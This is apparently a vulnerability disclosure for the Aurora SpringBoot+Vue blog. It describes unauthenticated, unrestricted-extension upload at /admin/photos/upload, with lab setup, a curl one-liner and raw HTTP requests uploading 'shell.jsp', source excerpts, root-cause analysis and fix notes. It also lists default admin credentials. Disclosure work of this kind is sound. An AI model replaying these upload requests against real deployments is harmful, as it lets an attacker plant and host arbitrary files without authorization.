### Vulnerability details

**Official website / Product:** https://github.com/linhaojun857/aurora (SpringBoot+Vue personal blog)

**Repository:** linhaojun857/aurora (stars at selection: 4664)

**Vulnerability type:** file_upload (unauthenticated unrestricted extension upload)

**Vulnerability versions:** current master `07e9524caacf6ceb021f3408e73f900f230d05f2` (2025-06-10); bundled SQL resource rows long mismatch controller paths

**Vulnerability URL / Parameter:** `POST /admin/photos/upload` (same root cause: `POST /admin/photos/albums/upload`); multipart field `file`; attacker-controlled `filename` extension

**Complex:** yes

### Verification procedure

1. **Lab** (original path `labs/aurora-r58-a2/`, host port **23802**). After audit the lab directory and images were removed (images previously used: `aurora-r58-a2-app:latest`, `mysql:8.0.36`, `redis:7.0.10`, `rabbitmq:3.11-management`, `docker.elastic.co/elasticsearch/elasticsearch:7.17.9`, `eclipse-temurin:8-jre`). Rebuild notes:
   - Check out commit `07e9524caacf6ceb021f3408e73f900f230d05f2`;
   - Stack: `mysql:8.0.36` + `redis:7.0.10` + `rabbitmq:3.11` + `elasticsearch:7.17.9` + app (multi-stage Maven / `eclipse-temurin:8-jre`; image was named `aurora-r58-a2-app`);
   - Default admin `admin@163.com` / `123456` (**not required** — this finding is unauthenticated);
   - **Lab-only adaptations (do not change root cause):** (1) add a `local` upload strategy and static `/uploads/**` (MinIO pull blocked on the lab host; production defaults `upload.mode=minio|oss`; the auth gap and missing extension allowlist exist in original code); (2) soften `OperationLogAspect` anonymous ClassCast so the HTTP response returns success JSON (without this, the file was still written but the response became `系统异常`);
   - `docker compose up -d --build`, wait until `GET /articles/all` returns 200, then run the PoC.
   - Expected bring-up shape (Compose project `aurora-r58-a2`): `aurora-r58-a2-mysql-1` / `redis-1` / `rabbitmq-1` / `elasticsearch-1` become Healthy, then `aurora-r58-a2-app-1` Started.
2. Without any token, contrast against the registered upload `POST /admin/articles/images` → expect `用户未登录` (that path is present in `t_resource`).
3. Without any token, `POST /admin/photos/upload` with an arbitrary extension (PoC: `shell.jsp`, body `r58a2-clean-poc-20261102`). One-liner equivalent:
   ```bash
   printf 'r58a2-clean-poc-20261102' > /tmp/proof.txt
   curl -F 'file=@/tmp/proof.txt;filename=shell.jsp' http://127.0.0.1:23802/admin/photos/upload
   ```
4. Response `flag:true` with an access URL; `GET` that URL returns the uploaded bytes (see PoC below).

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /admin/photos/upload HTTP/1.0
Host: 127.0.0.1:23802
Accept: application/json
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr58a2clean
Content-Length: 209

------WebKitFormBoundaryr58a2clean
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

r58a2-clean-poc-20261102
------WebKitFormBoundaryr58a2clean--
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Type: application/json
Date: Mon, 02 Nov 2026 13:14:52 GMT
Connection: close

{"flag":true,"code":20000,"message":"操作成功","data":"http://127.0.0.1:23802/uploads/aurora/photos/be58162dd7746bfc123f977c6ab56022.jsp"}
```

Verification result notes:

Unauthenticated upload succeeded and returned an object URL. Fetching the object (full message):

```http
GET /uploads/aurora/photos/be58162dd7746bfc123f977c6ab56022.jsp HTTP/1.0
Host: 127.0.0.1:23802

HTTP/1.1 200 
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Last-Modified: Mon, 02 Nov 2026 13:14:18 GMT
Accept-Ranges: bytes
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Type: application/octet-stream
Content-Length: 24
Date: Mon, 02 Nov 2026 13:14:52 GMT
Connection: close

r58a2-clean-poc-20261102
```

Contrast: registered upload `POST /admin/articles/images` without auth returns:

```http
HTTP/1.1 200 
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY
Content-Type: application/json;charset=utf-8
Content-Length: 55
Date: Mon, 02 Nov 2026 13:14:42 GMT

{"code":40001,"flag":false,"message":"用户未登录"}
```

Measured contrast summary (unauth upload success vs protected endpoint denial):

```
=== unauth upload success ===
{"flag":true,"code":20000,"message":"操作成功","data":"http://127.0.0.1:23802/uploads/aurora/photos/be58162dd7746bfc123f977c6ab56022.jsp"}

=== fetch ===
r58a2-clean-poc-20261102

=== contrast protected ===
{"code":40001,"flag":false,"message":"用户未登录"}
```

Note: product default `upload.mode` is minio/oss. The lab used a local storage backend only because MinIO images could not be pulled on the lab host; **the auth gap and missing extension allowlist exist in original code**. Spring Boot static serving does not execute JSP, so this is counted as file_upload (not getshell). On production object storage with public read, impact is arbitrary attacker-controlled object hosting. Same root cause also covers `POST /admin/photos/albums/upload` (seed SQL lists `/admin/photos/albums/cover`, which mismatches the controller).

### Vulnerability analysis

1. **RBAC miss:** `FilterInvocationSecurityMetadataSourceImpl#getAttributes` only enforces roles for URLs present in `t_resource` with `is_anonymous=0`. Unmatched URLs return `null` and Spring Security allows the request. `PhotoController` maps `POST /admin/photos/upload`, which is **absent** from seed SQL. Album cover resource is seeded as `/admin/photos/albums/cover` while the controller uses `/admin/photos/albums/upload`.
2. **No type checks:** `AbstractUploadStrategyImpl#uploadFile` concatenates `FileUtil.getExtName(originalFilename)` onto an MD5 name with no extension allowlist / content sniffing, so arbitrary extensions are stored.

Trigger / sink source (full path and line numbers):

```java
# File: aurora-springboot/src/main/java/com/aurora/controller/PhotoController.java
# Lines: 33-39
    @OptLog(optType = UPLOAD)
    @ApiOperation(value = "上传照片")
    @ApiImplicitParam(name = "file", value = "照片", required = true, dataType = "MultipartFile")
    @PostMapping("/admin/photos/upload")
    public ResultVO<String> savePhotoAlbumCover(MultipartFile file) {
        return ResultVO.ok(uploadStrategyContext.executeUploadStrategy(file, FilePathEnum.PHOTO.getPath()));
    }
```

```java
# File: aurora-springboot/src/main/java/com/aurora/strategy/impl/AbstractUploadStrategyImpl.java
# Lines: 14-28
    @Override
    public String uploadFile(MultipartFile file, String path) {
        try {
            String md5 = FileUtil.getMd5(file.getInputStream());
            String extName = FileUtil.getExtName(file.getOriginalFilename());
            String fileName = md5 + extName;
            if (!exists(path + fileName)) {
                upload(path, fileName, file.getInputStream());
            }
            return getFileAccessUrl(path + fileName);
        } catch (Exception e) {
            e.printStackTrace();
            throw new BizException("文件上传失败");
        }
    }
```

```java
# File: aurora-springboot/src/main/java/com/aurora/handler/FilterInvocationSecurityMetadataSourceImpl.java
# Lines: 45-54
        for (ResourceRoleDTO resourceRoleDTO : resourceRoleList) {
            if (antPathMatcher.match(resourceRoleDTO.getUrl(), url) && resourceRoleDTO.getRequestMethod().equals(method)) {
                List<String> roleList = resourceRoleDTO.getRoleList();
                if (CollectionUtils.isEmpty(roleList)) {
                    return SecurityConfig.createList("disable");
                }
                return SecurityConfig.createList(roleList.toArray(new String[]{}));
            }
        }
        return null;
```

### Fix notes

1. Register real paths `POST /admin/photos/upload` and `POST /admin/photos/albums/upload` in `t_resource` (or align controller paths with seed data) and bind admin roles; refresh metadata via `clearDataSource()`.
2. Enforce a strict extension allowlist and content sniffing; reject double extensions and path traversal.
3. Fail closed for unmatched admin routes so newly added endpoints are not anonymous by default.
